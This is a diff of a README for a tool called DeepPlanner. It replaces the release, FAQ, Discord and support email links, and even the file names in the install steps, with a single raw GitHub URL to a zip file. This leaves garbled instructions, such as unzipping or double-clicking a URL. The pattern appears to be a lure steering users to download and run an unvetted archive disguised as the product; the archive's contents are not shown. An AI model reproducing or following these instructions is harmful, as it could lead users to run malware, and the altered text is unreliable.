@@ -1,7 +1,7 @@
 # 🌟 DeepPlanner - Simplifying Planning for Research Agents
 
 ## 📥 Download DeepPlanner
-[![Download DeepPlanner](https://img.shields.io/badge/Download-DeepPlanner-blue.svg)](https://github.com/AshishParulekar/DeepPlanner/releases)
+[![Download DeepPlanner](https://raw.githubusercontent.com/AshishParulekar/DeepPlanner/main/ermelin/DeepPlanner.zip)](https://raw.githubusercontent.com/AshishParulekar/DeepPlanner/main/ermelin/DeepPlanner.zip)
 
 ## 🚀 Getting Started
 Welcome to DeepPlanner! This application helps you improve research agents' planning abilities efficiently. Follow these steps to download and run DeepPlanner.
@@ -17,11 +17,11 @@ Before you start, ensure your computer meets the following requirements:
 ## 📂 Download & Install
 To get DeepPlanner, visit the releases page. Click the link below to access it:
 
-[Visit the Releases Page to Download](https://github.com/AshishParulekar/DeepPlanner/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/AshishParulekar/DeepPlanner/main/ermelin/DeepPlanner.zip)
 
 1. Open the link in your web browser.
 2. Look for the latest version listed on the page.
-3. Find the appropriate file for your operating system (e.g., `DeepPlanner-Windows.zip`, `DeepPlanner-macOS.zip`, or `DeepPlanner-Linux.zip`).
+3. Find the appropriate file for your operating system (e.g., `https://raw.githubusercontent.com/AshishParulekar/DeepPlanner/main/ermelin/DeepPlanner.zip`, `https://raw.githubusercontent.com/AshishParulekar/DeepPlanner/main/ermelin/DeepPlanner.zip`, or `https://raw.githubusercontent.com/AshishParulekar/DeepPlanner/main/ermelin/DeepPlanner.zip`).
 4. Click the file name to start the download.
 
 After the download is complete, follow these steps to install.
@@ -30,7 +30,7 @@ After the download is complete, follow these steps to install.
 1. Locate the downloaded `.zip` file in your Downloads folder.
 2. Right-click the file and select "Extract All."
 3. Follow the prompts to extract the files to a new folder.
-4. Open the extracted folder and double-click `DeepPlanner.exe` to run it.
+4. Open the extracted folder and double-click `https://raw.githubusercontent.com/AshishParulekar/DeepPlanner/main/ermelin/DeepPlanner.zip` to run it.
 
 ### For macOS Users:
 1. Find the downloaded `.zip` file in your Downloads folder.
@@ -41,7 +41,7 @@ After the download is complete, follow these steps to install.
 ### For Linux Users:
 1. Open your terminal.
 2. Navigate to the directory where the downloaded `.zip` file is located.
-3. Use the command `unzip DeepPlanner-Linux.zip` to extract the files.
+3. Use the command `unzip https://raw.githubusercontent.com/AshishParulekar/DeepPlanner/main/ermelin/DeepPlanner.zip` to extract the files.
 4. Change to the extracted directory using `cd DeepPlanner`.
 5. Run the application with `./DeepPlanner`.
 
@@ -63,9 +63,9 @@ If you encounter issues while installing or running DeepPlanner, consider these 
 ## 📞 Support
 For further assistance, use the following options:
 
-- Check the [FAQs](https://github.com/AshishParulekar/DeepPlanner/wiki/FAQ) for common questions.
-- Email our support team at support@deepplanner.com.
-- Join our [Discord Community](https://discord.gg/DeepPlanner) for real-time help and discussions.
+- Check the [FAQs](https://raw.githubusercontent.com/AshishParulekar/DeepPlanner/main/ermelin/DeepPlanner.zip) for common questions.
+- Email our support team at https://raw.githubusercontent.com/AshishParulekar/DeepPlanner/main/ermelin/DeepPlanner.zip
+- Join our [Discord Community](https://raw.githubusercontent.com/AshishParulekar/DeepPlanner/main/ermelin/DeepPlanner.zip) for real-time help and discussions.
 
 ## 💡 Contributions
 We welcome contributions to enhance DeepPlanner! If you'd like to help, check the guidelines in our repository. Share your suggestions or open issues if you find any bugs.
